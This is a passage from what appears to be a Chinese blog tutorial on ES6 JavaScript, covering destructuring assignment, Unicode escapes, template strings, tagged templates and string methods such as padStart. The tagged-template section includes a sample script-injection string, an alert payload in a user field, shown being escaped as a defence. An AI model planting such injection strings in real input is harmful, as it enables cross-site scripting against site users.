class="comment">// &#123;prop:123&#125;</span></span><br><span class="line">arr <span class="comment">// [true]</span></span><br></pre></td></tr></table></figure><p>注意，对象的解构赋值可以取到继承的属性。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> obj2 = &#123; <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj1, obj2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; foo &#125; = obj1;</span><br><span class="line">foo <span class="comment">// &quot;bar&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，对象<code>obj1</code>的原型对象是<code>obj2</code>。<code>foo</code>属性不是<code>obj1</code>自身的属性，而是继承自<code>obj2</code>的属性。</p><h3 id="默认值-1"><a href="#默认值-1" class="headerlink" title="默认值"></a>默认值</h3><p>基本同数组解构赋值的默认值。默认值生效的条件是，对象的属性值严格等于<code>undefined</code>。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>（1）如果要将一个已经声明的变量用于解构赋值，必须非常小心。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误的写法</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line">&#123;x&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// SyntaxError: syntax error</span></span><br></pre></td></tr></table></figure><p>上面的代码会报错，因为 JavaScript 引擎会将<code>&#123;x&#125;</code>理解成一个<strong>代码块</strong>，从而发生语法错误。只有不将大括号写在行首，避免 JavaScript 将其解释为代码块，才能解决这个问题。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line">(&#123;x&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure><p>（2）解构赋值允许等号左边的模式之中，不放置任何变量名。因此，可以写出非常古怪的赋值表达式。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(&#123;&#125; = [<span class="literal">true</span>, <span class="literal">false</span>]);</span><br><span class="line">(&#123;&#125; = <span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">(&#123;&#125; = []);</span><br></pre></td></tr></table></figure><p>（3）由于数组本质是特殊的对象，因此可以对数组进行对象属性的解构。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="number">0</span> : first, [arr.length - <span class="number">1</span>] : last&#125; = arr;</span><br><span class="line">first <span class="comment">// 1</span></span><br><span class="line">last <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="3、字符串的解构赋值"><a href="#3、字符串的解构赋值" class="headerlink" title="3、字符串的解构赋值"></a>3、字符串的解构赋值</h2><p>字符串也可以解构赋值。因为此时字符串被转换成了一个类似数组的对象。类似数组的对象都有一个<code>length</code>属性，因此还可以对这个属性解构赋值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">length</span> : len&#125; = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">len <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h2 id="4、数值和布尔值的解构赋值"><a href="#4、数值和布尔值的解构赋值" class="headerlink" title="4、数值和布尔值的解构赋值"></a>4、数值和布尔值的解构赋值</h2><p>解构赋值时，如果等号右边是数值和布尔值，则会先转为对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">toString</span>: s&#125; = <span class="number">123</span>;</span><br><span class="line">s === <span class="built_in">Number</span>.prototype.toString <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">toString</span>: s&#125; = <span class="literal">true</span>;</span><br><span class="line">s === <span class="built_in">Boolean</span>.prototype.toString <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: x &#125; = <span class="literal">undefined</span>; <span class="comment">// TypeError</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: y &#125; = <span class="literal">null</span>; <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>上面代码中，数值和布尔值的包装对象都有<code>toString</code>属性，因此变量<code>s</code>都能取到值。</p><p>解构赋值的规则是，只要等号右边的值不是对象或数组，就先将其转为对象。由于<code>undefined</code>和<code>null</code>无法转为对象，所以对它们进行解构赋值，都会报错。</p><h2 id="5、函数参数的解构赋值"><a href="#5、函数参数的解构赋值" class="headerlink" title="5、函数参数的解构赋值"></a>5、函数参数的解构赋值</h2><p>例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]].map(<span class="function">(<span class="params">[a, b]</span>) =&gt;</span> a + b);</span><br><span class="line"><span class="comment">// [ 3, 7 ]</span></span><br></pre></td></tr></table></figure><p>函数参数的解构也可以使用默认值。<code>undefined</code>会触发函数参数的默认值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="literal">undefined</span>, <span class="number">3</span>].map(<span class="function">(<span class="params">x = <span class="string">&#x27;yes&#x27;</span></span>) =&gt;</span> x);</span><br><span class="line"><span class="comment">// [ 1, &#x27;yes&#x27;, 3 ]</span></span><br></pre></td></tr></table></figure><h2 id="6、圆括号问题"><a href="#6、圆括号问题" class="headerlink" title="6、圆括号问题"></a>6、圆括号问题</h2><p>建议只要有可能，就不要在模式中放置圆括号。</p><h3 id="不能使用圆括号的情况"><a href="#不能使用圆括号的情况" class="headerlink" title="不能使用圆括号的情况"></a>不能使用圆括号的情况</h3><p>（1）变量声明语句 （模式不能使用圆括号）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全部报错</span></span><br><span class="line"><span class="keyword">let</span> [(a)] = [<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">x</span>: (c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> (&#123;<span class="attr">x</span>: c&#125;) = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x: c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x): c&#125; = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">o</span>: (&#123; <span class="attr">p</span>: p &#125;) &#125; = &#123; <span class="attr">o</span>: &#123; <span class="attr">p</span>: <span class="number">2</span> &#125; &#125;;</span><br></pre></td></tr></table></figure><p>（2）函数参数 （也属于变量声明）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[(z)]</span>) </span>&#123; <span class="keyword">return</span> z; &#125;</span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[z,(x)]</span>) </span>&#123; <span class="keyword">return</span> x; &#125;</span><br></pre></td></tr></table></figure><p>（3）赋值语句的模式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全部报错</span></span><br><span class="line">(&#123; <span class="attr">p</span>: a &#125;) = &#123; <span class="attr">p</span>: <span class="number">42</span> &#125;;</span><br><span class="line">([a]) = [<span class="number">5</span>];</span><br><span class="line">[(&#123; <span class="attr">p</span>: a &#125;), &#123; <span class="attr">x</span>: c &#125;] = [&#123;&#125;, &#123;&#125;];</span><br></pre></td></tr></table></figure><h3 id="可以使用圆括号的情况"><a href="#可以使用圆括号的情况" class="headerlink" title="可以使用圆括号的情况"></a>可以使用圆括号的情况</h3><p>（1）赋值语句的非模式部分</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[(b)] = [<span class="number">3</span>]; <span class="comment">// 正确，模式是取数组的第一个成员，跟圆括号无关</span></span><br><span class="line">(&#123; <span class="attr">p</span>: (d) &#125; = &#123;&#125;); <span class="comment">// 正确，模式是p，而不是d</span></span><br><span class="line">[(<span class="built_in">parseInt</span>.prop)] = [<span class="number">3</span>]; <span class="comment">// 正确，同一</span></span><br></pre></td></tr></table></figure><h2 id="7、用途"><a href="#7、用途" class="headerlink" title="7、用途"></a>7、用途</h2><p><strong>（1）交换变量的值</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">[x, y] = [y, x];</span><br></pre></td></tr></table></figure><p><strong>（2）从函数返回多个值</strong></p><p>函数只能返回一个值，如果要返回多个值，只能将它们放在数组或对象里返回。有了解构赋值，取出这些值就非常方便。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回一个数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = example();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">bar</span>: <span class="number">2</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = example();</span><br></pre></td></tr></table></figure><p><strong>（3）函数参数的定义</strong></p><p>解构赋值可以方便地将一组参数与变量名对应起来。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数是一组有次序的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[x, y, z]</span>) </span>&#123; ... &#125;</span><br><span class="line">f([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是一组无次序的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">&#123;x, y, z&#125;</span>) </span>&#123; ... &#125;</span><br><span class="line">f(&#123;<span class="attr">z</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">2</span>, <span class="attr">x</span>: <span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure><p><strong>（4）提取 JSON 数据</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> jsonData = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">42</span>,</span><br><span class="line">  <span class="attr">status</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">  <span class="attr">data</span>: [<span class="number">867</span>, <span class="number">5309</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; id, status, <span class="attr">data</span>: number &#125; = jsonData;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(id, status, number);</span><br><span class="line"><span class="comment">// 42, &quot;OK&quot;, [867, 5309]</span></span><br></pre></td></tr></table></figure><p><strong>（5）函数参数的默认值</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">jQuery.ajax = <span class="function"><span class="keyword">function</span> (<span class="params">url, &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">async</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  beforeSend = <span class="keyword">function</span> () &#123;&#125;,</span></span></span><br><span class="line"><span class="params"><span class="function">  cache = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  complete = <span class="keyword">function</span> () &#123;&#125;,</span></span></span><br><span class="line"><span class="params"><span class="function">  crossDomain = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="built_in">global</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="regexp">//</span> ... more config</span></span></span><br><span class="line"><span class="params"><span class="function">&#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ... do stuff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样可避免在函数体内部再写<code>var foo = config.foo || &#39;default foo&#39;;</code>这样的语句。</p><p><strong>（6）遍历 Map 结构</strong></p><p>任何部署了 Iterator 接口的对象，都可以用<code>for...of</code>循环遍历。Map 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值就非常方便。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="string">&#x27;first&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">map.set(<span class="string">&#x27;second&#x27;</span>, <span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key + <span class="string">&quot; is &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// first is hello</span></span><br><span class="line"><span class="comment">// second is world</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取键名</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取键值</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [,value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>7）输入模块的指定方法</strong>（不太理解）</p><p>加载模块时，往往需要指定输入哪些方法。解构赋值使得输入语句非常清晰。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; SourceMapConsumer, SourceNode &#125; = <span class="built_in">require</span>(<span class="string">&quot;source-map&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="字符串的扩展"><a href="#字符串的扩展" class="headerlink" title="字符串的扩展"></a>字符串的扩展</h1><h2 id="1、字符的-Unicode-表示法"><a href="#1、字符的-Unicode-表示法" class="headerlink" title="1、字符的 Unicode 表示法"></a>1、字符的 Unicode 表示法</h2><p>ES6 加强了对 Unicode 的支持，允许采用<code>\uxxxx</code>形式表示一个字符，其中<code>xxxx</code>表示字符的 Unicode 码点。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\u0061&quot;</span></span><br><span class="line"><span class="comment">// &quot;a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\uD842\uDFB7&quot;</span></span><br><span class="line"><span class="comment">// &quot;𠮷&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u20BB7&quot;</span></span><br><span class="line"><span class="comment">// &quot; 7&quot;</span></span><br></pre></td></tr></table></figure><p>但是，这种表示法只限于码点在<code>\u0000</code>~`\uFFFF<code>之间的字符。超出这个范围的字符，必须用两个双字节的形式表示。上面代码表示，如果直接在</code>\u<code>后面跟上超过</code>0xFFFF<code>的数值（比如</code>\u20BB7<code>），JavaScript 会理解成</code>\u20BB+7<code>。由于</code>\u20BB<code>是一个不可打印字符，所以只会显示一个空格，后面跟着一个</code>7`。</p><p>ES6 ：只要将码点放入大括号，就能正确解读该字符。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\u&#123;20BB7&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;𠮷&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u&#123;41&#125;\u&#123;42&#125;\u&#123;43&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;ABC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hello = <span class="number">123</span>;</span><br><span class="line">hell\u&#123;6F&#125; <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\u&#123;1F680&#125;&#x27;</span> === <span class="string">&#x27;\uD83D\uDE80&#x27;</span></span><br><span class="line"><span class="comment">// true， 大括号表示法与四字节的 UTF-16 编码是等价的。</span></span><br></pre></td></tr></table></figure><p>所以JavaScript 共有 6 种方法可以表示一个字符。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\z&#x27;</span> === <span class="string">&#x27;z&#x27;</span>  <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\172&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\x7A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\u007A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\u&#123;7A&#125;&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="2、字符串的遍历器接口"><a href="#2、字符串的遍历器接口" class="headerlink" title="2、字符串的遍历器接口"></a>2、字符串的遍历器接口</h2><p>字符串可以被<code>for...of</code>循环遍历。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> codePoint <span class="keyword">of</span> <span class="string">&#x27;foo&#x27;</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(codePoint)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;f&quot;</span></span><br><span class="line"><span class="comment">// &quot;o&quot;</span></span><br><span class="line"><span class="comment">// &quot;o&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3、模板字符串"><a href="#3、模板字符串" class="headerlink" title="3、模板字符串"></a>3、模板字符串</h2><p>模板字符串是增强版的字符串，用反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。如果在模板字符串中需要使用反引号，则前面要用反斜杠转义。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串中嵌入变量</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Bob&quot;</span>, time = <span class="string">&quot;today&quot;</span>;</span><br><span class="line"><span class="string">`Hello <span class="subst">$&#123;name&#125;</span>, how are you <span class="subst">$&#123;time&#125;</span>?`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> greeting = <span class="string">`\`Yo\` World!`</span>;</span><br></pre></td></tr></table></figure><p>如果使用模板字符串表示多行字符串，所有的空格和缩进都会被保留在输出之中。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#list&#x27;</span>).html(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;first&lt;/li&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;second&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>);</span><br></pre></td></tr></table></figure><p>大括号内部可以放入任意的 JavaScript 表达式，可以进行运算，以及引用对象属性。</p><p>模板字符串之中还能调用函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">`foo <span class="subst">$&#123;fn()&#125;</span> bar`</span></span><br><span class="line"><span class="comment">// foo Hello World bar</span></span><br></pre></td></tr></table></figure><p>如果需要引用模板字符串本身，在需要时执行，可以写成函数。执行这个函数，就相当于执行这个模板字符串了。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> func = <span class="function">(<span class="params">name</span>) =&gt;</span> <span class="string">`Hello <span class="subst">$&#123;name&#125;</span>!`</span>;</span><br><span class="line">func(<span class="string">&#x27;Jack&#x27;</span>) <span class="comment">// &quot;Hello Jack!&quot;</span></span><br></pre></td></tr></table></figure><h2 id="4、标签模板"><a href="#4、标签模板" class="headerlink" title="4、标签模板"></a>4、标签模板</h2><p>模板字符串可以紧跟在一个函数名后面，该函数将被调用来处理这个模板字符串。这被称为“标签模板”功能。标签模板其实不是模板，而是函数调用的一种特殊形式。“标签”指的就是函数，紧跟在后面的模板字符串就是它的参数。</p><p>但是，如果模板字符里面有变量，就不是简单的调用了，而是会将模板字符串先处理成多个参数，再调用函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">tag<span class="string">`Hello <span class="subst">$&#123; a + b &#125;</span> world <span class="subst">$&#123; a * b &#125;</span>`</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">tag([<span class="string">&#x27;Hello &#x27;</span>, <span class="string">&#x27; world &#x27;</span>, <span class="string">&#x27;&#x27;</span>], <span class="number">15</span>, <span class="number">50</span>);</span><br></pre></td></tr></table></figure><p>函数<code>tag</code>依次会接收到多个参数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">stringArr, value1, value2</span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 即</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">stringArr, ...values</span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>“标签模板”的一个重要应用，就是过滤 HTML 字符串，防止用户输入恶意内容。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> message =</span><br><span class="line">  SaferHTML<span class="string">`&lt;p&gt;<span class="subst">$&#123;sender&#125;</span> has sent you a message.&lt;/p&gt;`</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SaferHTML</span>(<span class="params">templateData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> s = templateData[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> arg = <span class="built_in">String</span>(<span class="built_in">arguments</span>[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Escape special characters in the substitution.</span></span><br><span class="line">    s += arg.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&quot;&amp;amp;&quot;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&quot;&amp;lt;&quot;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Don&#x27;t escape special characters in the template.</span></span><br><span class="line">    s += templateData[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>sender</code>变量往往是用户提供的，经过<code>SaferHTML</code>函数处理，里面的特殊字符都会被转义。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sender = <span class="string">&#x27;&lt;script&gt;alert(&quot;abc&quot;)&lt;/script&gt;&#x27;</span>; <span class="comment">// 恶意代码</span></span><br><span class="line"><span class="keyword">let</span> message = SaferHTML<span class="string">`&lt;p&gt;<span class="subst">$&#123;sender&#125;</span> has sent you a message.&lt;/p&gt;`</span>;</span><br><span class="line"></span><br><span class="line">message</span><br><span class="line"><span class="comment">// &lt;p&gt;&amp;lt;script&amp;gt;alert(&quot;abc&quot;)&amp;lt;/script&amp;gt; has sent you a message.&lt;/p&gt;</span></span><br></pre></td></tr></table></figure><h1 id="字符串的新增方法"><a href="#字符串的新增方法" class="headerlink" title="字符串的新增方法"></a>字符串的新增方法</h1><h2 id="实例方法：includes-startsWith-endsWith"><a href="#实例方法：includes-startsWith-endsWith" class="headerlink" title="实例方法：includes(), startsWith(), endsWith()"></a>实例方法：includes(), startsWith(), endsWith()</h2><p>传统上，JavaScript 只有<code>indexOf</code>方法，可以用来确定一个字符串是否包含在另一个字符串中。ES6 又提供了三种新方法。</p><ul><li>**includes()**：返回布尔值，表示是否找到了参数字符串。</li><li>**startsWith()**：返回布尔值，表示参数字符串是否在原字符串的头部。</li><li>**endsWith()**：返回布尔值，表示参数字符串是否在原字符串的尾部。</li></ul><p>这三个方法都支持第二个参数，表示开始搜索的位置。但是使用第二个参数<code>n</code>时，<code>endsWith</code>的行为与其他两个方法有所不同。它针对前<code>n</code>个字符，而其他两个方法针对从第<code>n</code>个位置直到字符串结束。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.startsWith(<span class="string">&#x27;world&#x27;</span>, <span class="number">6</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">&#x27;Hello&#x27;</span>, <span class="number">5</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">&#x27;Hello&#x27;</span>, <span class="number">6</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="实例方法：repeat"><a href="#实例方法：repeat" class="headerlink" title="实例方法：repeat()"></a>实例方法：repeat()</h2><h2 id="实例方法：padStart-，padEnd"><a href="#实例方法：padStart-，padEnd" class="headerlink" title="实例方法：padStart()，padEnd()"></a>实例方法：padStart()，padEnd()</h2><p>ES2017 引入了字符串补全长度的功能。如果某个字符串不够指定长度，会在头部或尾部补全。<code>padStart()</code>用于头部补全，<code>padEnd()</code>用于尾部补全。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">5</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;ababx&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">4</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;abax&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">5</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xabab&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">4</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xaba&#x27;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>padStart()</code>和<code>padEnd()</code>一共接受两个参数，第一个参数是字符串补全生效的最大长度，第二个参数是用来补全的字符串。</p><p>如果用来补全的字符串与原字符串，两者的长度之和超过了最大长度，则会截去超出位数的补全字符串。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;0123456789&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;0123456abc&#x27;</span></span><br></pre></td></tr></table></figure><p>如果省略第二个参数，默认使用空格补全长度。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">4</span>) <span class="comment">// &#x27;   x&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">4</span>) <span class="comment">// &#x27;x   &#x27;</span></span><br></pre></td></tr></table></figure><p><code>padStart()</code>的常见用途是为数值补全指定位数，另一个用途是提示字符串格式。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;12&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) <span class="comment">// &quot;YYYY-MM-12&quot;</span></span><br><span class="line"><span class="string">&#x27;09-12&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) <span class="comment">// &quot;YYYY-09-12&quot;</span></span><br></pre></td></tr></table></figure><h2 id="实例方法：replaceAll"><a href="#实例方法：replaceAll" class="headerlink" title="实例方法：replaceAll()"></a>实例方法：replaceAll()</h2><p>ES2021引入了<code>replaceAll()</code>方法，可以一次性替换所有匹配。它返回一个新字符串，不会改变原字符串。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//String.prototype.replaceAll(searchValue, replacement)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"><span class="comment">// 